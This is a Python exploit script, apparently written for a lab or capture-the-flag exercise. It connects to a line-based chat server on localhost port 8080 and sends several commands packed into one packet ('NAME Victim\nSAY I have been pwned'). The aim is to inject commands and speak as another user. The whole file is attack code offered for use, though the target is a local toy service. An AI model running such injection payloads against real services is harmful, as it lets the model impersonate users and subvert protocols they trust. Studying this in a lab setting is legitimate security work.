#!/usr/bin/env python3
import socket
import time

HOST = "127.0.0.1"
PORT = 8080

def send_command(sock, command):
    """Helper function to send a command and wait for response"""
    print(f"Sending: {command.strip()}")
    sock.sendall(command.encode())
    time.sleep(0.1)  # Small delay to let server process
    try:
        response = sock.recv(1024, socket.MSG_DONTWAIT).decode()
        print(f"Response: {response.strip()}")
    except:
        print("No response or connection closed")

def exploit():
    print("[+] Connecting to server...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Receive welcome message
    welcome_msg = s.recv(1024).decode()
    print(f"Server: {welcome_msg.strip()}")
    
    # Send commands with proper delays between them
    send_command(s, "NAME Attacker\n")
    send_command(s, "SAY I am here\n")
    
    # Now try the injection - send multiple commands in one packet
    print("\n[+] Attempting command injection...")
    malicious_payload = "NAME Victim\nSAY I have been pwned\n"
    print(f"Sending malicious payload: {malicious_payload.strip()}")
    s.sendall(malicious_payload.encode())
    
    time.sleep(1)  # Wait for broadcasts to happen
    
    # Try to receive any error messages
    try:
        while True:
            data = s.recv(1024, socket.MSG_DONTWAIT).decode()
            if data:
                print(f"Received: {data.strip()}")
            else:
                break
    except:
        pass
    
    s.close()
    print("[+] Injection attempt complete.")

if __name__ == "__main__":
    exploit()
